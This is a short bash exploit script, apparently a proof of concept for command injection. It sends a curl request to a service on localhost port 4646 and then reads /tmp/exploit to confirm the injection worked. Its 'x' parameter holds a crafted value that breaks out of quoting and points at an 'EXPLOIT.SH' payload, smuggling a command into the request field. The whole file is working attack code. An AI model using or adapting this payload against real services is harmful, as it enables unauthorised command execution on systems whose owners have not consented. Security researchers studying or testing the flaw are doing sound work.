#!/bin/bash
curl -Gv '127.0.0.1:4646'					\
--data-urlencode "x=\"</;/*/EXPLOIT.SH;#"	\
--data-urlencode "y=0"
cat /tmp/exploit
